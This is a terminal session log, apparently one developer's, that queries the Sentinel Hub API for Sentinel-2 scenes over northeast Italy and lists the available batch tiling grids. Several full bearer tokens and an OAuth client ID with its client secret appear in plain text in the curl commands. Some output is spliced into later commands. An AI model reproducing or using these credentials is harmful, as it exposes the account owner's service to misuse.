download"}]},{"stac_version":"1.0.0","stac_extensions":["https://stac-extensions.github.io/eo/v1.0.0/schema.json","https://stac-extensions.github.io/projection/v1.0.0/schema.json"],"id":"S2A_MSIL2A_20240128T101301_N0510_R022_T33TUL_20240128T121856","type":"Feature","geometry":{"type":"MultiPolygon","crs":{"type":"name","properties":{"name":"urn:ogc:def:crs:OGC::CRS84"}},"coordinates":[[[[12.415948204321996,46.024344695659195],[12.46075827747173,45.037931698599245],[13.527172962471584,45.057210876300495],[13.839100346289698,45.80824310425432],[13.834095356164024,46.04761849125311],[12.415948204321996,46.024344695659195]]]]},"bbox":[12.415948204321996,45.037931698599245,13.839100346289698,46.04761849125311],"properties":{"datetime":"2024-01-28T10:18:01Z","platform":"sentinel-2a","instruments":["msi"],"constellation":"sentinel-2","gsd":10,"eo:cloud_cover":8.79,"proj:epsg":32633,"proj:bbox":[300000.0,4990200.0,409800.0,5100000.0],"proj:geometry":{"type":"MultiPolygon","crs":{"type":"name","properties":{"name":"urn:ogc:def:crs:EPSG::32633"}},"coordinates":[[[[300000.9998697532,5099999.000171126],[300000.99988545355,4990301.000885111],[384034.2841547869,4990360.939034668],[409798.999999508,5073397.597638843],[409798.9999994927,5099999.000172377],[300000.9998697532,5099999.000171126]]]]}},"assets":{"data":{"href":"s3://sentinel-s2-l2a/tiles/33/T/UL/2024/1/28/0/","title":"s3","type":"inode/directory"}},"collection":"sentinel-2-l2a","links":[{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/","rel":"root","type":"application/json"},{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/collections/sentinel-2-l2a/items/S2A_MSIL2A_20240128T101301_N0510_R022_T33TUL_20240128T121856","rel":"self","type":"application/geo+json"},{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/collections/sentinel-2-l2a","rel":"parent","type":"application/json"},{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/collections/sentinel-2-l2a","rel":"collection","type":"application/json"},{"href":"https://scihub.copernicus.eu/dhus/odata/v1/Products('7e5db2a1-b719-42d6-b3ec-e5ac56b34f69')/$value","rel":"derived_from","title":"scihub download"}]},{"stac_version":"1.0.0","stac_extensions":["https://stac-extensions.github.io/eo/v1.0.0/schema.json","https://stac-extensions.github.io/projection/v1.0.0/schema.json"],"id":"S2A_MSIL2A_20240125T100311_N0510_R122_T33TUL_20240125T123352","type":"Feature","geometry":{"type":"MultiPolygon","crs":{"type":"name","properties":{"name":"urn:ogc:def:crs:OGC::CRS84"}},"coordinates":[[[[12.51047879119534,46.02644421336872],[12.4269093398829,45.787763225387124],[12.460798077329557,45.037032390528786],[13.854352586282992,45.05952247124274],[13.834095356164024,46.04761849125311],[12.51047879119534,46.02644421336872]]]]},"bbox":[12.4269093398829,45.037032390528786,13.854352586282992,46.04761849125311],"properties":{"datetime":"2024-01-25T10:08:04Z","platform":"sentinel-2a","instruments":["msi"],"constellation":"sentinel-2","gsd":10,"eo:cloud_cover":81.66,"proj:epsg":32633,"proj:bbox":[300000.0,4990200.0,409800.0,5100000.0],"proj:geometry":{"type":"MultiPolygon","crs":{"type":"name","properties":{"name":"urn:ogc:def:crs:EPSG::32633"}},"coordinates":[[[[307324.56083770643,5099999.000171176],[300000.9998737396,5073686.926656178],[300000.99988546676,4990201.000146128],[409798.99999955244,4990201.000147356],[409798.9999994927,5099999.000172377],[307324.56083770643,5099999.000171176]]]]}},"assets":{"data":{"href":"s3://sentinel-s2-l2a/tiles/33/T/UL/2024/1/25/0/","title":"s3","type":"inode/directory"}},"collection":"sentinel-2-l2a","links":[{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/","rel":"root","type":"application/json"},{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/collections/sentinel-2-l2a/items/S2A_MSIL2A_20240125T100311_N0510_R122_T33TUL_20240125T123352","rel":"self","type":"application/geo+json"},{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/collections/sentinel-2-l2a","rel":"parent","type":"application/json"},{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/collections/sentinel-2-l2a","rel":"collection","type":"application/json"},{"href":"https://scihub.copernicus.eu/dhus/odata/v1/Products('36e52091-7cf3-4b83-9584-6ba58acc01c5')/$value","rel":"derived_from","title":"scihub download"}]},{"stac_version":"1.0.0","stac_extensions":["https://stac-extensions.github.io/eo/v1.0.0/schema.json","https://stac-extensions.github.io/projection/v1.0.0/schema.json"],"id":"S2B_MSIL2A_20240123T101229_N0510_R022_T33TUL_20240123T113349","type":"Feature","geometry":{"type":"MultiPolygon","crs":{"type":"name","properties":{"name":"urn:ogc:def:crs:OGC::CRS84"}},"coordinates":[[[[12.415948204321996,46.024344695659195],[12.46075827746866,45.03793169866862],[13.516380509549453,45.05707108459602],[13.83697561040987,45.8300281028487],[13.83280304793178,46.04760529973847],[12.415948204321996,46.024344695659195]]]]},"bbox":[12.415948204321996,45.03793169866862,13.83697561040987,46.04760529973847],"properties":{"datetime":"2024-01-23T10:18:05Z","platform":"sentinel-2b","instruments":["msi"],"constellation":"sentinel-2","gsd":10,"eo:cloud_cover":0.12,"proj:epsg":32633,"proj:bbox":[300000.0,4990200.0,409800.0,5100000.0],"proj:geometry":{"type":"MultiPolygon","crs":{"type":"name","properties":{"name":"urn:ogc:def:crs:EPSG::32633"}},"coordinates":[[[[300000.9998697532,5099999.000171126],[300000.99988545367,4990301.0008928245],[383184.2361558279,4990360.931179318],[409669.1485282809,5075820.3708235035],[409698.9986879511,5099999.000172376],[300000.9998697532,5099999.000171126]]]]}},"assets":{"data":{"href":"s3://sentinel-s2-l2a/tiles/33/T/UL/2024/1/23/0/","title":"s3","type":"inode/directory"}},"collection":"sentinel-2-l2a","links":[{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/","rel":"root","type":"application/json"},{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/collections/sentinel-2-l2a/items/S2B_MSIL2A_20240123T101229_N0510_R022_T33TUL_20240123T113349","rel":"self","type":"application/geo+json"},{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/collections/sentinel-2-l2a","rel":"parent","type":"application/json"},{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/collections/sentinel-2-l2a","rel":"collection","type":"application/json"},{"href":"https://scihub.copernicus.eu/dhus/odata/v1/Products('81c8c2f0-2a59-48cf-8a86-119ebdc18fd0')/$value","rel":"derived_from","title":"scihub download"}]},{"stac_version":"1.0.0","stac_extensions":["https://stac-extensions.github.io/eo/v1.0.0/schema.json","https://stac-extensions.github.io/projection/v1.0.0/schema.json"],"id":"S2B_MSIL2A_20240120T100239_N0510_R122_T33TUL_20240120T113505","type":"Feature","geometry":{"type":"MultiPolygon","crs":{"type":"name","properties":{"name":"urn:ogc:def:crs:OGC::CRS84"}},"coordinates":[[[[12.499118773501518,46.026196049858044],[12.425667516910273,45.81471583647947],[12.460798077329557,45.037032390528786],[13.854352586282992,45.05952247124274],[13.834095356164024,46.04761849125311],[12.499118773501518,46.026196049858044]]]]},"bbox":[12.425667516910273,45.037032390528786,13.854352586282992,46.04761849125311],"properties":{"datetime":"2024-01-20T10:08:09Z","platform":"sentinel-2b","instruments":["msi"],"constellation":"sentinel-2","gsd":10,"eo:cloud_cover":0.19,"proj:epsg":32633,"proj:bbox":[300000.0,4990200.0,409800.0,5100000.0],"proj:geometry":{"type":"MultiPolygon","crs":{"type":"name","properties":{"name":"urn:ogc:def:crs:EPSG::32633"}},"coordinates":[[[[306444.50984854554,5099999.000171167],[300000.999873293,5076684.470464974],[300000.99988546676,4990201.000146128],[409798.99999955244,4990201.000147356],[409798.9999994927,5099999.000172377],[306444.50984854554,5099999.000171167]]]]}},"assets":{"data":{"href":"s3://sentinel-s2-l2a/tiles/33/T/UL/2024/1/20/0/","title":"s3","type":"inode/directory"}},"collection":"sentinel-2-l2a","links":[{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/","rel":"root","type":"application/json"},{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/collections/sentinel-2-l2a/items/S2B_MSIL2A_20240120T100239_N0510_R122_T33TUL_20240120T113505","rel":"self","type":"application/geo+json"},{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/collections/sentinel-2-l2a","rel":"parent","type":"application/json"},{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/collections/sentinel-2-l2a","rel":"collection","type":"application/json"},{"href":"https://scihub.copernicus.eu/dhus/odata/v1/Products('411482ff-a166-4c94-8626-fad013f04b7e')/$value","rel":"derived_from","title":"scihub download"}]}],"links":[{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/search","rel":"self","type":"application/geo+json"},{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/search","rel":"next","type":"application/geo+json","title":"Next set of results","method":"POST","body":{"next":5},"merge":true}],"context":{"next":5,"limit":5,"returned":5}}(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ curl -X GET "https://services.sentinel-hub.com/api/v2/batch" \ -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ3dE9hV1o2aFJJeUowbGlsYXctcWd4NzlUdm1hX3ZKZlNuMW1WNm5HX0tVIn0.eyJleHAiOjE3NzMwNTU0MDMsImlhdCI6MTc3MzA1MTgwMywianRpIjoiZThjZDQ5Y2YtYTVjMi00NWRlLWIzZmYtNTJjYzhkNGI5NzAyIiwiaXNzIjoiaHR0cHM6Ly9zZXJ2aWNlcy5zZW50aW5lbC1odWIuY29tL2F1dGgvcmVhbG1zL21haW4iLCJhdWQiOiJodHRwczovL2FwaS5wbGFuZXQuY29tLyIsInN1YiI6IjlhNmRjODk2LTdmZDktNDAyNS1iODlkLTVlZTRlMTdkNDM4ZSIsInR5cCI6IkJlYXJlciIsImF6cCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsInNjb3BlIjoiZW1haWwgcHJvZmlsZSIsImNsaWVudEhvc3QiOiI0OS4zNy4xNjEuMjAyIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJwbF9wcm9qZWN0IjoiNTJkZWUxMGItYWYyMC00ZTcwLTlhZDYtODBjMzNlMzQwYjAyIiwicHJlZmVycmVkX3VzZXJuYW1lIjoic2VydmljZS1hY2NvdW50LTExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsImNsaWVudEFkZHJlc3MiOiI0OS4zNy4xNjEuMjAyIiwiYWNjb3VudCI6IjUyZGVlMTBiLWFmMjAtNGU3MC05YWQ2LTgwYzMzZTM0MGIwMiIsInBsX3dvcmtzcGFjZSI6IjhhZjlmYzI1LTkyYTMtNDk4Mi05ZmFkLWY5MjI2YWIxZjE2NCIsImNsaWVudF9pZCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCJ9.CpCxTT_NcYF1_y2M7ZVS4mf6BTHAf4Al388LP3Wht46t_gsIzek6EYcQmKswes430uYL52FBKbMQ1zE9OEYjErL1DJDeSYDuI7M8wg_fDuSM6hsVCxC3MhkBS0L6Jw1XlDEWsc3Htl6QDIYNdP3IY9ASdemvHJEpXQi2GEMneFNLCir9TsGM3tjDh6LmWNRlZWWU31DZ6MRiWOXxWocJSqsYMwQaVyNCMhPIOycWdgAJRlRx6uawOcR6FnovXVlMZZelNew7fpavVGk4DVCl5dwiYk_0SuMqhwvVxztNZQHoZe_yVAWcJEdHCzAyFcj6qcaGnI_MyGE53P3z5R0yaA”
> "
curl: (3) URL rejected: Malformed input to a URL function
curl: (3) URL rejected: Malformed input to a URL function
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ curl -X POST "https://services.sentinel-hub.com/api/v1/catalog/1.0.0/search" \
>      -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ3dE9hV1o2aFJJeUowbGlsYXctcWd4NzlUdm1hX3ZKZlNuMW1WNm5HX0tVIn0.eyJleHAiOjE3NzMwNTU0MDMsImlhdCI6MTc3MzA1MTgwMywianRpIjoiZThjZDQ5Y2YtYTVjMi00NWRlLWIzZmYtNTJjYzhkNGI5NzAyIiwiaXNzIjoiaHR0cHM6Ly9zZXJ2aWNlcy5zZW50aW5lbC1odWIuY29tL2F1dGgvcmVhbG1zL21haW4iLCJhdWQiOiJodHRwczovL2FwaS5wbGFuZXQuY29tLyIsInN1YiI6IjlhNmRjODk2LTdmZDktNDAyNS1iODlkLTVlZTRlMTdkNDM4ZSIsInR5cCI6IkJlYXJlciIsImF6cCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsInNjb3BlIjoiZW1haWwgcHJvZmlsZSIsImNsaWVudEhvc3QiOiI0OS4zNy4xNjEuMjAyIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJwbF9wcm9qZWN0IjoiNTJkZWUxMGItYWYyMC00ZTcwLTlhZDYtODBjMzNlMzQwYjAyIiwicHJlZmVycmVkX3VzZXJuYW1lIjoic2VydmljZS1hY2NvdW50LTExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsImNsaWVudEFkZHJlc3MiOiI0OS4zNy4xNjEuMjAyIiwiYWNjb3VudCI6IjUyZGVlMTBiLWFmMjAtNGU3MC05YWQ2LTgwYzMzZTM0MGIwMiIsInBsX3dvcmtzcGFjZSI6IjhhZjlmYzI1LTkyYTMtNDk4Mi05ZmFkLWY5MjI2YWIxZjE2NCIsImNsaWVudF9pZCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCJ9.CpCxTT_NcYF1_y2M7ZVS4mf6BTHAf4Al388LP3Wht46t_gsIzek6EYcQmKswes430uYL52FBKbMQ1zE9OEYjErL1DJDeSYDuI7M8wg_fDuSM6hsVCxC3MhkBS0L6Jw1XlDEWsc3Htl6QDIYNdP3IY9ASdemvHJEpXQi2GEMneFNLCir9TsGM3tjDh6LmWNRlZWWU31DZ6MRiWOXxWocJSqsYMwQaVyNCMhPIOycWdgAJRlRx6uawOcR6FnovXVlMZZelNew7fpavVGk4DVCl5dwiYk_0SuMqhwvVxztNZQHoZe_yVAWcJEdHCzAyFcj6qcaGnI_MyGE53P3z5R0yaA" \
>      -H "Content-Type: application/json" \
>      -d '{
>         "bbox": [13, 45, 14, 46],
>         "datetime": "2024-01-01T00:00:00Z/2024-01-02T23:59:59Z",
>         "collections": ["sentinel-2-l2a"],
>         "limit": 1
>       }'
{"type":"FeatureCollection","features":[],"links":[{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/search","rel":"self","type":"application/geo+json"}],"context":{"limit":1,"returned":0}}(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ curl -X GET "https://services.sentinel-hub.com/api/v2/batch" \
>      -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ3dE9hV1o2aFJJeUowbGlsYXctcWd4NzlUdm1hX3ZKZlNuMW1WNm5HX0tVIn0.eyJleHAiOjE3NzMwNTU0MDMsImlhdCI6MTc3MzA1MTgwMywianRpIjoiZThjZDQ5Y2YtYTVjMi00NWRlLWIzZmYtNTJjYzhkNGI5NzAyIiwiaXNzIjoiaHR0cHM6Ly9zZXJ2aWNlcy5zZW50aW5lbC1odWIuY29tL2F1dGgvcmVhbG1zL21haW4iLCJhdWQiOiJodHRwczovL2FwaS5wbGFuZXQuY29tLyIsInN1YiI6IjlhNmRjODk2LTdmZDktNDAyNS1iODlkLTVlZTRlMTdkNDM4ZSIsInR5cCI6IkJlYXJlciIsImF6cCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsInNjb3BlIjoiZW1haWwgcHJvZmlsZSIsImNsaWVudEhvc3QiOiI0OS4zNy4xNjEuMjAyIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJwbF9wcm9qZWN0IjoiNTJkZWUxMGItYWYyMC00ZTcwLTlhZDYtODBjMzNlMzQwYjAyIiwicHJlZmVycmVkX3VzZXJuYW1lIjoic2VydmljZS1hY2NvdW50LTExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsImNsaWVudEFkZHJlc3MiOiI0OS4zNy4xNjEuMjAyIiwiYWNjb3VudCI6IjUyZGVlMTBiLWFmMjAtNGU3MC05YWQ2LTgwYzMzZTM0MGIwMiIsInBsX3dvcmtzcGFjZSI6IjhhZjlmYzI1LTkyYTMtNDk4Mi05ZmFkLWY5MjI2YWIxZjE2NCIsImNsaWVudF9pZCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCJ9.CpCxTT_NcYF1_y2M7ZVS4mf6BTHAf4Al388LP3Wht46t_gsIzek6EYcQmKswes430uYL52FBKbMQ1zE9OEYjErL1DJDeSYDuI7M8wg_fDuSM6hsVCxC3MhkBS0L6Jw1XlDEWsc3Htl6QDIYNdP3IY9ASdemvHJEpXQi2GEMneFNLCir9TsGM3tjDh6LmWNRlZWWU31DZ6MRiWOXxWocJSqsYMwQaVyNCMhPIOycWdgAJRlRx6uawOcR6FnovXVlMZZelNew7fpavVGk4DVCl5dwiYk_0SuMqhwvVxztNZQHoZe_yVAWcJEdHCzAyFcj6qcaGnI_MyGE53P3z5R0yaA"
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ curl -X GET "https://services.sentinel-hub.com/api/v2/batch/tilinggrids" \
>      -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ3dE9hV1o2aFJJeUowbGlsYXctcWd4NzlUdm1hX3ZKZlNuMW1WNm5HX0tVIn0.eyJleHAiOjE3NzMwNTU0MDMsImlhdCI6MTc3MzA1MTgwMywianRpIjoiZThjZDQ5Y2YtYTVjMi00NWRlLWIzZmYtNTJjYzhkNGI5NzAyIiwiaXNzIjoiaHR0cHM6Ly9zZXJ2aWNlcy5zZW50aW5lbC1odWIuY29tL2F1dGgvcmVhbG1zL21haW4iLCJhdWQiOiJodHRwczovL2FwaS5wbGFuZXQuY29tLyIsInN1YiI6IjlhNmRjODk2LTdmZDktNDAyNS1iODlkLTVlZTRlMTdkNDM4ZSIsInR5cCI6IkJlYXJlciIsImF6cCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsInNjb3BlIjoiZW1haWwgcHJvZmlsZSIsImNsaWVudEhvc3QiOiI0OS4zNy4xNjEuMjAyIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJwbF9wcm9qZWN0IjoiNTJkZWUxMGItYWYyMC00ZTcwLTlhZDYtODBjMzNlMzQwYjAyIiwicHJlZmVycmVkX3VzZXJuYW1lIjoic2VydmljZS1hY2NvdW50LTExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsImNsaWVudEFkZHJlc3MiOiI0OS4zNy4xNjEuMjAyIiwiYWNjb3VudCI6IjUyZGVlMTBiLWFmMjAtNGU3MC05YWQ2LTgwYzMzZTM0MGIwMiIsInBsX3dvcmtzcGFjZSI6IjhhZjlmYzI1LTkyYTMtNDk4Mi05ZmFkLWY5MjI2YWIxZjE2NCIsImNsaWVudF9pZCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCJ9.CpCxTT_NcYF1_y2M7ZVS4mf6BTHAf4Al388LP3Wht46t_gsIzek6EYcQmKswes430uYL52FBKbMQ1zE9OEYjErL1DJDeSYDuI7M8wg_fDuSM6hsVCxC3MhkBS0L6Jw1XlDEWsc3Htl6QDIYNdP3IY9ASdemvHJEpXQi2GEMneFNLCir9TsGM3tjDh6LmWNRlZWWU31DZ6MRiWOXxWocJSqsYMwQaVyNCMhPIOycWdgAJRlRx6uawOcR6FnovXVlMZZelNew7fpavVGk4DVCl5dwiYk_0SuMqhwvVxztNZQHoZe_yVAWcJEdHCzAyFcj6qcaGnI_MyGE53P3z5R0yaA"
{"error":{"status":401,"reason":"Unauthorized","mesPOST "https://services.sentinel-hub.com/auth/realms/main/protocol/openid-connect/token"  -H "Content-Type: application/x-www-form-urlencoded"  -d "grant_type=client_credentials"  -d "client_id=116eecdd-ff1b-47f6-8592-f68f0ea6d810"  -d "client_secret=TeTqh5HIAaqAx4VimmsyiYf8nUSjBVS9"
{"access_token":"eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ3dE9hV1o2aFJJeUowbGlsYXctcWd4NzlUdm1hX3ZKZlNuMW1WNm5HX0tVIn0.eyJleHAiOjE3NzMwNTk1NzYsImlhdCI6MTc3MzA1NTk3NiwianRpIjoiZDNjMzgwYTgtZTk2Yi00YzBkLWE1OGMtMWYyMWJhZDk5YjZmIiwiaXNzIjoiaHR0cHM6Ly9zZXJ2aWNlcy5zZW50aW5lbC1odWIuY29tL2F1dGgvcmVhbG1zL21haW4iLCJhdWQiOiJodHRwczovL2FwaS5wbGFuZXQuY29tLyIsInN1YiI6IjlhNmRjODk2LTdmZDktNDAyNS1iODlkLTVlZTRlMTdkNDM4ZSIsInR5cCI6IkJlYXJlciIsImF6cCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsInNjb3BlIjoiZW1haWwgcHJvZmlsZSIsImNsaWVudEhvc3QiOiI0OS4zNy4xNjEuMjAyIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJwbF9wcm9qZWN0IjoiNTJkZWUxMGItYWYyMC00ZTcwLTlhZDYtODBjMzNlMzQwYjAyIiwicHJlZmVycmVkX3VzZXJuYW1lIjoic2VydmljZS1hY2NvdW50LTExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsImNsaWVudEFkZHJlc3MiOiI0OS4zNy4xNjEuMjAyIiwiYWNjb3VudCI6IjUyZGVlMTBiLWFmMjAtNGU3MC05YWQ2LTgwYzMzZTM0MGIwMiIsInBsX3dvcmtzcGFjZSI6IjhhZjlmYzI1LTkyYTMtNDk4Mi05ZmFkLWY5MjI2YWIxZjE2NCIsImNsaWVudF9pZCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCJ9.HgUfioK2p_J893EIyQ2w02HDTHdt-mQd78d0d2UJ4sC6AJxg6516LAo2c6eVp4jQuQnkmxCYdumMti92m28TTNcpED1Hbt6kkVAbcNPJHnNAzISycq0VjXpTCAmhoJVqUsIOoUP4OdXwnYN6yLFzNL9h-UBhTUUiSc_RG_XfLNW9PISdc3CISe-JuflzzUApyRKHKdEGNQTdvJ_WOLq2GrAnTkhr5Kj5mcXRClHTXZgFHT6Ctz2nmUMkCZ1QW2t0FtLsoTEeVUuZ8WUWYfz-ESaShtGSfipqi78lhd0pFlp3gH4-OBQeFONUMwcFj4hh1dMlHVCTR3XmHpMz5g6XCA","expires_in":3600,"refresh_expires_in":0,"token_type":"Bearer","not-before-policy":0,"scope":"email profile"}(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ curl -X GET "https://services.sentinel-hub.com/api/v2/batch/tilinggrids" \
>      -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ3dE9hV1o2aFJJeUowbGlsYXctcWd4NzlUdm1hX3ZKZlNuMW1WNm5HX0tVIn0.eyJleHAiOjE3NzMwNTk1NzYsImlhdCI6MTc3MzA1NTk3NiwianRpIjoiZDNjMzgwYTgtZTk2Yi00YzBkLWE1OGMtMWYyMWJhZDk5YjZmIiwiaXNzIjoiaHR0cHM6Ly9zZXJ2aWNlcy5zZW50aW5lbC1odWIuY29tL2F1dGgvcmVhbG1zL21haW4iLCJhdWQiOiJodHRwczovL2FwaS5wbGFuZXQuY29tLyIsInN1YiI6IjlhNmRjODk2LTdmZDktNDAyNS1iODlkLTVlZTRlMTdkNDM4ZSIsInR5cCI6IkJlYXJlciIsImF6cCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsInNjb3BlIjoiZW1haWwgcHJvZmlsZSIsImNsaWVudEhvc3QiOiI0OS4zNy4xNjEuMjAyIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJwbF9wcm9qZWN0IjoiNTJkZWUxMGItYWYyMC00ZTcwLTlhZDYtODBjMzNlMzQwYjAyIiwicHJlZmVycmVkX3VzZXJuYW1lIjoic2VydmljZS1hY2NvdW50LTExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsImNsaWVudEFkZHJlc3MiOiI0OS4zNy4xNjEuMjAyIiwiYWNjb3VudCI6IjUyZGVlMTBiLWFmMjAtNGU3MC05YWQ2LTgwYzMzZTM0MGIwMiIsInBsX3dvcmtzcGFjZSI6IjhhZjlmYzI1LTkyYTMtNDk4Mi05ZmFkLWY5MjI2YWIxZjE2NCIsImNsaWVudF9pZCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCJ9.HgUfioK2p_J893EIyQ2w02HDTHdt-mQd78d0d2UJ4sC6AJxg6516LAo2c6eVp4jQuQnkmxCYdumMti92m28TTNcpED1Hbt6kkVAbcNPJHnNAzISycq0VjXpTCAmhoJVqUsIOoUP4OdXwnYN6yLFzNL9h-UBhTUUiSc_RG_XfLNW9PISdc3CISe-JuflzzUApyRKHKdEGNQTdvJ_WOLq2GrAnTkhr5Kj5mcXRClHTXZgFHT6Ctz2nmUMkCZ1QW2t0FtLsoTEeVUuZ8WUWYfz-ESaShtGSfipqi78lhd0pFlp3gH4-OBQeFONUMwcFj4hh1dMlHVCTR3XmHpMz5g6XCA"
{"data":[{"id":0,"name":"20km grid","properties":{"tileWidth":20040.0,"tileHeight":20040.0,"chunkWidth":334,"chunkHeight":167,"resolutions":[10.0,20.0,60.0],"singleCrs":false,"unit":"METRE"}},{"id":1,"name":"10km grid","properties":{"tileWidth":10000.0,"tileHeight":10000.0,"chunkWidth":500,"chunkHeight":500,"resolutions":[1.0,10.0,20.0,1.4999],"singleCrs":false,"unit":"METRE"}},{"id":2,"name":"100km grid","properties":{"tileWidth":100080.0,"tileHeight":100080.0,"chunkWidth":278,"chunkHeight":278,"resolutions":[360.0,60.0,120.0,240.0],"singleCrs":false,"unit":"METRE"}},{"id":3,"name":"WGS84 1 degree grid","properties":{"tileWidth":1.0,"tileHeight":1.0,"chunkWidth":500,"chunkHeight":500,"resolutions":[5.0E-4,0.001,0.002,0.005,0.008,1.0E-4,2.0E-4,8.0E-4],"singleCrs":true,"unit":"DEGREE"}},{"id":6,"name":"LAEA 100km grid","properties":{"tileWidth":100000.0,"tileHeight":100000.0,"chunkWidth":0,"chunkHeight":0,"resolutions":[40.0,50.0,100.0],"singleCrs":true,"unit":"METRE"}},{"id":7,"name":"LAEA 20km grid","properties":{"tileWidth":20000.0,"tileHeight":20000.0,"chunkWidth":0,"chunkHeight":0,"resolutions":[10.0,20.0],"singleCrs":true,"unit":"METRE"}}],"links":{"currentToken":"0","@id":"https://services.sentinel-hub.com/api/v2/batch/tilinggrids?viewtoken=0"}}(base) Anands-MacBook-POST "https://services.sentinel-hub.com/auth/realms/main/protocol/openid-connect/token"  -H "Content-Type: application/x-www-form-urlencoded"  -d "grant_type=client_credentials"  -d "client_id=116eecdd-ff1b-47f6-8592-f68f0ea6d810"  -d "client_secret=TeTqh5HIAaqAx4VimmsyiYf8nUSjBVS9"
